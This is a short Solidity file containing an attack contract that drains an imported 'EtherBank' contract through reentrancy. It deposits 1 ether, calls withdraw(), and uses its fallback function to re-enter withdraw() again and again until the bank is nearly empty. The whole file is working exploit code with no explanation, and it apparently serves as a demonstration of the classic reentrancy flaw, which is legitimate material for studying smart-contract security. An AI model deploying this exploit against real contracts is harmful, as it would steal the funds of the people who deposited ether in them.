// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "./EtherBank.sol";

contract Attack {
    EtherBank public etherBank;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress);
    }

    fallback() external payable {
        if (address(etherBank).balance > AMOUNT) {
            etherBank.withdraw();
        }
    }

    function rob() external payable {
        require(msg.value > AMOUNT);
        etherBank.deposit{value: AMOUNT}();
        etherBank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
